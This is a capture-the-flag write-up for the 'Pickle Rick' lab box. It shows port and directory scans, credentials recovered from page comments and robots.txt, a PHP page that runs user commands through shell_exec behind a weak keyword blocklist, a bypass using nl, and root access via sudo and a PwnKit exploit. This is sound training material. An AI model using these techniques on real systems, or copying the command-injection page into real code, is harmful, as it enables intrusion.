# Box Name
## Pickle Rick
---

## Overview
### A Rick and Morty CTF. Help turn Rick back into a human!
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
## nmap
```
rustscan -r 1-65535 -a 10.10.18.212 --ulimit 9000 -- -sCV -oN nmap/initial.md
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 9000.
Open 10.10.18.212:22
Open 10.10.18.212:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-10 13:18 UTC

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:5d:4d:ed:74:89:84:8c:91:9b:35:df:3b:3f:2c:25 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD3QYJk2yPxLTyDsJd5xH1/u7GF06/A94fiHeF4jj4Ts5xUhCnfEXYsedM9A/2ZLWukqDmopCnfwZsSvr/NSOc83W42zh14sMwrXQRxqW5wKRLFp6zXpUExNRN648avxBzDxcwhNmZchNwLVbqlSR3mibJDBYrT6wSw3PO6mKPJO9YDHUrhZoSLUoMvqVs1EZNTeZfjr03aPYw1zmBSDDL11Z90rVzd/e7P0cCuhWIrZRrhsuI34pfFt1Tb3+3S2HhdhkM3HQPwY9mt1jlb11seUIZw9nSDU6zGPrmRPRnxvLcoSSCxOpZrvyzH4PE9BQzHbcV4ap9wHMORATDLAI8z
|   256 3b:8b:c3:c7:7e:eb:bf:6f:2e:67:18:38:80:e2:e6:25 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH3QKSa6GQm06023XFb15Hs7izh3sZ2qmbDXltaSItF58PwcIEdUK3L1dTFkPyyWwtHsgh3Tzy1+mOqD7GYctXk=
|   256 ee:9b:52:8c:8c:92:56:9f:b5:0f:79:a9:cd:2c:32:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJYotyjMAQXNAQr6PbLLBd0mVe6AXnTb+fWOKiRysFjH
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## ferox scan
```
ferox -u http://10.10.18.212 -w ~/SecLists/Discovery/Web-Content/common.txt -t 60 -x html,txt,php -C 403 -o logs/ferox_vhost.md 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.18.212
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/common.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox_vhost.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
200        1l        1w       17c http://10.10.18.212/robots.txt
200       25l       61w      882c http://10.10.18.212/login.php
200       37l      110w     1062c http://10.10.18.212/index.html
302        0l        0w        0c http://10.10.18.212/portal.php
301        9l       28w      313c http://10.10.18.212/assets
302        0l        0w        0c http://10.10.18.212/denied.php

```

- ## found username in index.html
```html
<!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->

```
- ## found password in /robots.txt
```
Wubbalubbadubdub
```

- ## /login.php
![[Pasted image 20220310134827.png]]

- ### login creds 
	- R1ckRul3s:Wubbalubbadubdub

---
## Initial Foothold
---
- ## http://10.10.18.212/portal.php
	- ![[Pasted image 20220310132613.png]]

	- appears to be a cli web interface 
	- downloaded portal.php
	```php
	<?php
      function contains($str, array $arr)
      {
          foreach($arr as $a) {
              if (stripos($str,$a) !== false) return true;
          }
          return false;
      }
      // Cant use cat
      $cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
      if(isset($_POST["command"])) {
        if(contains($_POST["command"], $cmds)) {
          echo "</br><p><u>Command disabled</u> to make it hard for future <b>PICKLEEEE RICCCKKKK</b>.</p><img src='assets/fail.gif'>";
        } else {
          $output = shell_exec($_POST["command"]);
          echo "</br><pre>$output</pre>";
        }
      }

    ?>

	```
	- ### gooled verious ways to read the contents of a file  in linux
		- ### found  **nl**
		The nl command, short for **number lines**, is very similar to the cat command, with the exception that the nl command numbers the output lines by default.
		Although the nl utility is primarily used for numbering output lines, you can also choose not to number the lines using the **-b** option as follows.
![[Pasted image 20220310150620.png]]

![[Pasted image 20220310151245.png]]

![[Pasted image 20220310150948.png]]

![[Pasted image 20220310151130.png]]
- ### bash one liner [[revshell]] 
![[Pasted image 20220310151412.png]]

# linpeas output
```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on ip-10-10-45-0.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-45-0.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

```
---
## Privilege Escalation
----
- ## sudo /bin/bash
```bash
root@ip-10-10-45-0:~# cat 3rd.txt
3rd ingredients: fleeb juice
root@ip-10-10-45-0:~# cat /home/rick/second\ ingredients 
1 jerry tear
root@ip-10-10-45-0:~# cat /var/www/html/Sup3rS3cretPickl3Ingred.txt 
mr. meeseek hair
root@ip-10-10-45-0:~# 
```

# CVE-2021-4034
```bash
www-data@ip-10-10-45-0:/tmp$ gcc pwnkit.c -o pwnd
www-data@ip-10-10-45-0:/tmp$ ./pwnd
# bash
root@ip-10-10-45-0:/tmp# 
```